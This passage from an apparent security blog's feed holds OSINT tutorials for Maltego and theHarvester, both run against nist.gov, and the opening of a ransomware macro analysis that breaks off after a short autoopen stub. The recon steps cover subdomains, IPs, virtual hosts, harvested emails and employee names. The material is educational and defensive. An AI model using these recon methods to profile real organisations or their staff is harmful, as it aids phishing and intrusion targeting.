&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_start.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_start.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Same thing can be done by clicking on the “Show application” menu:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_start2.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_start2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Maltego can also be started by opening the Terminal and typing &lt;code class=&quot;highlighter-rouge&quot;&gt;maltegoce&lt;/code&gt;, but since it is not a command line tool, this is not the best choice.&lt;/p&gt;

&lt;p&gt;At the start up, after all the modules are correctly loaded, we get prompted with the Startup Wizard which asks for Maltego account credentials:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_account.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_account.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you have inserted them and correctly solved the captcha, you will get a welcome message and the information about the validity of the API key.  At the next prompt just leave “Install Transforms from Maltego public servers” which will install the transforms on the client.&lt;br /&gt;
At the final screen we get the correct initialization message with different possibilities for starting to use Maltego:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/images/maltego/maltego_ready.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ready.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;“Run a machine” allows you to run predefined searches, called “machines”: for example, the “Company Stalker” machine gets all email addresses it can find on the web for a certain domain and look for related account on social networks; it also gets documents and extract metadata from them.&lt;br /&gt;
Since we want to perform a custom search we need to select “Open a blank graph and let me play around” and then click on “Finish”. This action opens a new empty graph where we can start a new OSINT activity:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_new.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_new.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We could have also opened a new graph by simply clicking on Maltego icon on the top left choosing “New”.&lt;br /&gt;
As the image shows, on the top part we have six tabs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Investigate - offers options to quickly search through the graph or to select entities;&lt;/li&gt;
  &lt;li&gt;Manage - allows to import/export configurations, manage entities and transforms;&lt;/li&gt;
  &lt;li&gt;View - allows to choose which panels are active;&lt;/li&gt;
  &lt;li&gt;Organize - sets the node layout mode and the alignment type;&lt;/li&gt;
  &lt;li&gt;Machines - allows to run, stop, create and manage machines;&lt;/li&gt;
  &lt;li&gt;Collaboration - offers options to share projects and results.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There is a big central window which is where the graph will be developed and on the tab it is reported the name of the graph (you can save the project and give it a proper name).&lt;br /&gt;
On the left side we have the “Palette” panel which contains the following categories:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Devices - adds a node such as a phone or camera;&lt;/li&gt;
  &lt;li&gt;Infrastructure - adds a node such as a domain, MX record or Website;&lt;/li&gt;
  &lt;li&gt;Locations - adds a node such as a GPS coordinate or location name;&lt;/li&gt;
  &lt;li&gt;Malware - adds a node as hash entity;&lt;/li&gt;
  &lt;li&gt;Penetration Testing - adds a node which identifies a technology;&lt;/li&gt;
  &lt;li&gt;Personal - adds a node such as a document, email address or person name;&lt;/li&gt;
  &lt;li&gt;Social Network - adds a node related to social networks like Facebook or Twitter.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each of them contains objects related to that category: these items can be dragged on the graph and, once placed there, it is possible to use them as starting point for a search activity. This can be done thanks to the application of &lt;em&gt;transforms&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;As done in the previous Information Gathering posts, we can use as target the National Institute of Standards and Technology (NIST).
We can start by clicking on “Infrastructure” and dragging on the graph a “Domain” object; by double clicking on it we can change its name into “nist.gov”:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_nist.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_nist.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now informations are displayed also in the other four panels:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Run View - contains Transforms and Machines that it is possible to run against the selected object;&lt;/li&gt;
  &lt;li&gt;Overview - shows a schematic graph where nodes are represented by colored circles;&lt;/li&gt;
  &lt;li&gt;Detail View - displays informations about the selected object;&lt;/li&gt;
  &lt;li&gt;Property View - shows properties regarding the selected object.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To run a transform on the object we can either access them through the “Run View” panel or by simply clicking on the object with the right mouse button. “All Transforms”  contains all the possible transforms we can apply to that object type, which in this case is a Domain object.&lt;br /&gt;
The same transforms can also be found by looking inside the following four groups (of course they vary depending on the object type):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DNS from Domain;&lt;/li&gt;
  &lt;li&gt;Domain owner detail;&lt;/li&gt;
  &lt;li&gt;Email addresses from Domain;&lt;/li&gt;
  &lt;li&gt;Files and Documents from Domain.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_transforms.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_transforms.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We can start by running the transform &lt;em&gt;DNS from Domain &amp;gt; DomainToDNSNameSchema&lt;/em&gt; which tries various name schema’s against the object domain; once the disclaimer is accepted, we can run the transform:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_DomainToDNSNameSchema.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_DomainToDNSNameSchema.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The execution of the transform can be verified in the “Output - Transform Output” panel: as reported, the tool searches for subdomains using lists of common names which are loaded on Paterva servers as files with extension “.bfdns”.&lt;br /&gt;
We can see that the graph is populated with subdomains found by the search; it is possible to switch from the Main View to the Bubble View or to the Entity List by simply clicking on the respective buttons on the top of the graph.&lt;br /&gt;
There is also the chance to change the layout mode by clicking on the icons on the upper part of the graph window; the default one is called “Block”.&lt;br /&gt;
Note that entities belonging to the same category are represented by circles of the same color in the Overview panel.&lt;/p&gt;

&lt;p&gt;Suppose we want to find the IP address for a certain subdomain, then we right click on the object and run &lt;em&gt;Resolve to IP&lt;/em&gt;; we can even select multiple objects using the “Shift” button and apply the transform to all of them:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_ResolveToIP.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ResolveToIP.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once we have the IP addresses we can run a further transform that returns the geolocation for that IP; just right click on the object, then &lt;em&gt;IP owner detail &amp;gt; toLocation&lt;/em&gt; and run it by clicking on the yellow arrow:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_ToLocation.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ToLocation.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The transform group “IP owner detail” is also really useful to find informations like email addresses, entities (person names) and phone numbers, so it is a good idea to take a look at the others transforms inside it.&lt;/p&gt;

&lt;p&gt;Now suppose we want to check, in a passive way, which websites are associated to the target domain: &lt;em&gt;DNS from Domain &amp;gt; To Website DNS [using Search Engines]&lt;/em&gt; is the transform we want to use. We can also choose which search engine we want to launch the query against (default is Bing); this can be done by clicking on the “Configure” icon near the yellow arrow key:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_configure.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_configure.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In this configuration menu there are also reported all the other transforms loaded in Maltego with their Status, Transform Server Location, Default Set, Input and Output informations.&lt;br /&gt;
Keep in mind that some transforms are more invasive than others: for example, it is possible to discover websites querying directly port 80 using the transform &lt;em&gt;To Web site [Query port 80]&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is the resulting graph with a focus on the websites:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_ToWebsite.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ToWebsite.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Note how Maltego automatically organizes nodes on the graph.&lt;/p&gt;

&lt;p&gt;A really useful transform which can be applied to Website objects is &lt;em&gt;ToServerTechnologiesWebsite&lt;/em&gt;; using the BuiltWith.com API it is able to retrieve informations about the technologies running on the target website:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_ToServerTechnologiesWebsite.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ToServerTechnologiesWebsite.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you think the graph is becoming heavy, it is possible to remove unwanted nodes by selecting them and pressing the “Canc” button.&lt;br /&gt;
Another interesting transform is the one named &lt;em&gt;Files and Documents from Domain&lt;/em&gt;: this will search for files and documents inside the given domain with the extensions reported in the configuration menu; by clicking on the node representing a file we can get informations about the query used to find it with the document download link.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_ToFiles.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ToFiles.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The following step could be to find email addresses related to the target domain by using &lt;em&gt;Email addresses from Domain&lt;/em&gt; transform on the “Domain” object; then we could run &lt;em&gt;To Person&lt;/em&gt; transform on the “Email” object to get person identity related to that email address or &lt;em&gt;To Phone number [using Search Engine]&lt;/em&gt; transform to try a phone number discovery.&lt;/p&gt;

&lt;p&gt;Like seen before, another way to proceed is to use predefined search machines which are configured to run with a more or less invasive approach against the target; be aware that you can create your own machine so as to exactly perform the queries you need and nothing more.&lt;/p&gt;

&lt;p&gt;You can even create your own transforms: &lt;a href=&quot;http://dev.paterva.com/developer/getting_started/building_your_own_tds_transform.php&quot;&gt;http://dev.paterva.com/developer/getting_started/building_your_own_tds_transform.php&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Maltego is a powerful graphical tool for OSINT and it can be customized depending on your own needs. Since it generates graphs it gives a rapid overview of the target structure, differently from command line tools. This is why it is always important to work with more than one tool so as to have a better picture of the target.&lt;br /&gt;
As always,  experiment with the transforms by yourself (there is a very good amount of them) to make the most of Maltego potential.&lt;/p&gt;
</description>
        <pubDate>Sat, 03 Sep 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/09/03/open-source-intelligence-with-maltego.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/09/03/open-source-intelligence-with-maltego.html</guid>
        
        <category>Information gathering</category>
        
        <category>OSINT</category>
        
        <category>Maltego</category>
        
        
      </item>
    
      <item>
        <title>Open Source Intelligence with theHarvester</title>
        <description>&lt;p&gt;Another interesting tool for gathering informations, which can be used in combination with &lt;a href=&quot;https://spreadsecurity.github.io/2016/08/01/open-source-web-reconnaissance-with-recon-ng.html&quot;&gt;Recon-ng&lt;/a&gt;, is theHarvester.&lt;br /&gt;
Even if this tool is not as complex as Recon-ng, it helps to harvest a huge quantity of data in an automated way by using web search engines and social networks. By doing so, this information gathering suite allows to understand target footprints on the Internet, so it is useful to know what an attacker can see on the web about a certain company.
&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you are using Kali Linux, theHarvester is already a part of your arsenal. Otherwise you can get the latest version from author repository using &lt;code class=&quot;highlighter-rouge&quot;&gt;git clone&lt;/code&gt; and install the tool on your favourite Linux distro: &lt;a href=&quot;https://github.com/laramies/theHarvester&quot;&gt;https://github.com/laramies/theHarvester&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Kali Linux, theHarvester can be started by navigating in the applications menu by clicking on &lt;em&gt;Applications &amp;gt; Information Gathering &amp;gt; OSINT Analysis &amp;gt; theharvester&lt;/em&gt; like shown in the following image:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/theharvester/theharvester_start.png&quot;&gt;&lt;img src=&quot;/images/theharvester/theharvester_start.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Same thing can be done by clicking on the “Show application” menu:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/theharvester/theharvester_start2.png&quot;&gt;&lt;img src=&quot;/images/theharvester/theharvester_start2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another possibility is launching it by simply opening the Terminal and typing &lt;code class=&quot;highlighter-rouge&quot;&gt;theharvester&lt;/code&gt;. In any case, we are prompted with the tool banner, version, author informations and usage instructions:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/theharvester/theharvester_intro.png&quot;&gt;&lt;img src=&quot;/images/theharvester/theharvester_intro.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The instructions are pretty clear: we have a series of parameters to set as arguments through which we can customize the search. For each of them there is a description of what they do; the most importants are “-d” and “-b” which are mandatory and determine respectively the &lt;em&gt;target domain&lt;/em&gt; about which we want to gather informations and the &lt;em&gt;data sources&lt;/em&gt; we want to use to find them (the list of the sources that can be set is reported in the description).&lt;br /&gt;
Some data sources require an API key to work: while the acquisition of some of them is free, like the Bing one, other require the payment of a fee, like the Shodan one.&lt;/p&gt;

&lt;p&gt;We will see now an example of information gathering activity performed on the National Institute of Standards and Technology (NIST) domain.&lt;br /&gt;
Since Google is one of the mentioned data sources we can use for the search, we can start with a simple request by asking all hosts and emails that Google Search Engine can find in the first 100 results for the domain “nist.gov” (email addresses written here are fictional for privacy reasons):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# theharvester -d nist.gov -b google -l 100
......................................................
[-] Searching in Google:
	Searching 0 results...
	Searching 100 results...


[+] Emails found:
------------------
bugsbunny@nist.gov
daffyduck@nist.gov
foghornleghorn@nist.gov

[+] Hosts found in search engines:
------------------------------------
[-] Resolving hostnames IPs... 
52.71.87.193:acvp.nist.gov
132.163.4.217:csrc.nist.gov
132.163.4.217:face.nist.gov
129.6.89.132:inside.nist.gov
132.163.4.217:itl.nist.gov
129.6.13.177:nvd.nist.gov
129.6.13.111:nvlpubs.nist.gov
52.71.217.42:pages.nist.gov
24.56.178.140:time.nist.gov
129.6.13.178:web.nvd.nist.gov
129.6.24.30:webbook.nist.gov
132.163.4.18:www.glb.nist.gov
132.163.4.18:www.nist.gov
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As reported above, the tool has quickly found emails, hostnames and has also resolved IP addresses.&lt;/p&gt;

&lt;p&gt;Another interesting feature is the capability to check for virtual hosts: through DNS resolution, the tool verifies if a certain IP address is associated with multiple hostnames. This is a really important information because the Security for a given host on that IP depends not only on its Security level, but also from how securely are configured the others hosted on that same IP. In fact, if an attacker comprimises one of them and gains access to the underlying server, then he can easily reach every other virtual host.&lt;br /&gt;
To launch a virtual host search we just need to add “-v”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# theharvester -d nist.gov -b google -l 100 -v
.........................................................
[+] Virtual hosts:
==================
132.163.4.217:csrc.nist.gov
132.163.4.217:trecvid.nist.gov
132.163.4.217:www.atp.nist.gov
132.163.4.217:www.itl.nist.gov
132.163.4.217:fire.nist.gov
132.163.4.217:www.iapws.org
132.163.4.217:www.boulder.nist.gov
132.163.4.217:itl.nist.gov
132.163.4.217:trec.nist.gov
132.163.4.217:duc.nist.gov
132.163.4.217:www.baldrige.nist.gov
132.163.4.217:zing.ncsl.nist.gov
132.163.4.217:biometrics.nist.gov
132.163.4.217:baldrige.nist.gov
132.163.4.217:ovrt.nist.gov
132.163.4.217:cryogenics.nist.gov
132.163.4.217:www.cryogenics.nist.gov
132.163.4.217:www-nlpir.nist.gov
132.163.4.217:ieee1451.nist.gov
132.163.4.217:w3.antd.nist.gov
132.163.4.217:tides.nist.gov
132.163.4.217:blea.doc.gov
132.163.4.217:motion.aptd.nist.gov
132.163.4.217:www.antd.nist.gov
132.163.4.217:iapws.org
129.6.13.111:nvlpubs.nist
129.6.13.111:gsi.nist
129.6.13.111:museum.nist
129.6.13.111:nvlpubs.nist.gov
129.6.13.111:gsi.nist.gov
129.6.13.111:museum.nist.gov
129.6.13.111:srdata.nist.gov
129.6.24.30:webbook.nist.gov
132.163.4.162:www.nist.gov
132.163.4.162:www.itl.nist.gov
132.163.4.162:tf.nist.gov
132.163.4.162:cnst.nist.gov
132.163.4.162:www.baldrige
132.163.4.162:fire.nist.gov
132.163.4.162:www.bldrdoc.gov
132.163.4.162:nvl.nist.gov
132.163.4.162:www.glb.nist.gov
132.163.4.162:gsi.nist.gov
132.163.4.162:math.nist.gov
132.163.4.162:ieee1451.nist.gov
132.163.4.162:www.tf.nist.gov
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;theHarvester is also able to acquire names of persons related to the target domain by crawling social networks such as LinkedIn; this can be done by simply using as data source the argument “linkedin” (fictional names are reported here for privacy reasons):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# theharvester -d nist.gov -b linkedin
.................................................
[-] Searching in Linkedin..
	Searching 100 results..
Users from Linkedin:
====================
Bugs Bunny
Daffy Duck
Foghorn Leghorn
.................................................
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once you have emails and names you can try to associate them to find a correspondence.&lt;/p&gt;

&lt;p&gt;It is ok to have results printed on the terminal standard output, but when we are dealing with a big amount of data it is nice to report them in a file for later use. theHarvester offers the opportunity to save results on both XML and HTML formats by specifying file name with “-f” option.&lt;br /&gt;
Before launching the command, it is always a good practice to create a folder where we can store gathered data about the target:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# mkdir NIST
root@kali:~# cd NIST
root@kali:~/NIST#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Then we can start the search and this time we use “-b all” which harvest informations using Google, PGP key server, Bing and Exalead:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/NIST# theharvester -d nist.gov -b all -l 100 -v -f results.html
........................................................................
[+] Saving files...
Files saved!
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;If the files are correctly saved we get the “Files saved!” message and we find them inside our current folder:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/NIST# ls
results.xml  results.html 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Finally we can open the HTML file with our favourite web browser:
&lt;a href=&quot;/images/theharvester/theharvester_report.png&quot;&gt;&lt;img src=&quot;/images/theharvester/theharvester_report.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As shown in the above image, we get a nice graph reporting the percentage of gathered data for each category part of our search: emails, hosts and virtual hosts. After that we just get a list of all the elements for each category (only a few lines are displayed here).&lt;/p&gt;

&lt;p&gt;Even if these are the parameters I use the most, feel free to play with the others.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;theHarvester is a valuable tool for OSINT which allows to quickly discover a good amount of data, especially email addresses. Remember that you need to verify informations: for example, it could be that an employer is not working anymore on a certain company, but his email address is still present on the web and so it will be returned in the results.&lt;br /&gt;
Automatic tools are useful, but still their outputs need to be correctly managed and interpreted.&lt;/p&gt;
</description>
        <pubDate>Mon, 22 Aug 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/08/22/open-source-intelligence-with-theharvester.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/08/22/open-source-intelligence-with-theharvester.html</guid>
        
        <category>Information gathering</category>
        
        <category>OSINT</category>
        
        <category>theHarvester</category>
        
        
      </item>
    
      <item>
        <title>Macro Malware Analysis</title>
        <description>&lt;p&gt;Malware, in general, is any kind of malicious program which executes on a machine; it can be used for a large variety of purposes such as influence computer behavior, display ads, steal personal informations, take control of remote machines and so on.&lt;br /&gt;
&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Ransomware&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Lately a particular category of malware, called ransomware, is spreading aggressively especially through email compaigns.
This kind of malicious program infects computers by encrypting files and asking for a ransom payment to recover them; attackers send emails to an extensive number of recepients (mass email attack) in order to infect as much machines as possible.&lt;br /&gt;
They tend to use Social Engineering techniques by writing an attractive email subject and text so as to trick users into opening an attachment or a link.&lt;br /&gt;
Once the victim opens the downloaded file (which can have different extensions, like “.exe”, “.doc”, “.xls”, “.js”, “.cab”), malware executes and infects the machine by encrypting data with RSA-2048 and AES-128 algorithm. Then, the user gets prompted with a screen asking for money in order to receive the key to restore encrypted data.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/macro_malware/ransomware.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recently, I got my hands on a ransomware variant which exploits Microsoft Office Macro to execute evil code. Of course, this one was attached in an email as a document with “.docm” extension which is the one used for Word documents with macros.&lt;br /&gt;
Macros are essentially scripts written in VBA (Visual Basic for Applications), a language used inside Office documents for automating frequent tasks and activities. Since they can interact with the system, attackers can use them as a starting point for the attack.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Macro code deobfuscation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Since we are working with Object Linking and Embedding (OLE), which is a Microsoft proprietary technology for compound documents (like the “.docm” we are threating), one possible way to start analyzing this kind of file is using a very nice utility called &lt;em&gt;oledump&lt;/em&gt;: &lt;a href=&quot;https://blog.didierstevens.com/programs/oledump-py&quot;&gt;https://blog.didierstevens.com/programs/oledump-py&lt;/a&gt;.&lt;br /&gt;
This tool allows to extract macro code so we can take a look at the source; we can launch the program and insert as input argument our “.docm” file which I have renamed “malware.docm”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/oledump_V0_0_25# ./oledump.py malware.docm 
A: word/vbaProject.bin
 A1:       419 &#39;PROJECT&#39;
 A2:        65 &#39;PROJECTwm&#39;
 A3: M   23316 &#39;VBA/Module1&#39;
 A4: M    1347 &#39;VBA/ThisDocument&#39;
 A5:      4445 &#39;VBA/_VBA_PROJECT&#39;
 A6:      1204 &#39;VBA/__SRP_0&#39;
 A7:       106 &#39;VBA/__SRP_1&#39;
 A8:       292 &#39;VBA/__SRP_2&#39;
 A9:       103 &#39;VBA/__SRP_3&#39;
A10:       572 &#39;VBA/dir&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Oledump returns a list of items describing document structure; we are interested in macro code, i.e. items A3 and A4, where tag M indicates the presence of macros. Once we have identified that the interesting portions are “Module1” (looking at the reported dimensions, this should be the core of the script) and “ThisDocument”, we can extract them with the following commands:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/oledump_V0_0_25# ./oledump.py malware.docm -v -s A3 &amp;gt; Module1
root@kali:~/oledump_V0_0_25# ./oledump.py malware.docm -v -s A4 &amp;gt; ThisDocument
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We can start by taking a look at “ThisDocument”:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ThisDocument&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1Normal.ThisDocument&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_GlobalNameSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;False&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Creatable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;False&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_PredeclaredId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Exposed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_TemplateDerived&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Customizable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;True&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Sub&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;autoopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SAAKASHVILLI_MUDEN&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Rastyag&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Sub&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Immediately, there is something that catches the attention: in the last three lines there is the &lt;em&gt;autoopen()&lt;/em&gt; function, which is used for launching macro execution at the opening of the file; this is a first sign of malware activity.&lt;br /&gt;
Since there is nothing else here, we can continue the analysis by checking “Module1”. This file is pretty big, but it contains a lot of junk code and uses encryption; this is done for two main reasons: one is to decrease the chances of detection by Antivirus softwares and the other one is to increase difficulty, for a security analyst, of blocking the attack as fast as possible.&lt;br /&gt;
The code starts with some variables definitions and here I have reported only the useful ones:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VB_Name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Module1&quot;&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighDAcdaw&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Object&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKCwwed&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Object&lt;/span&gt;
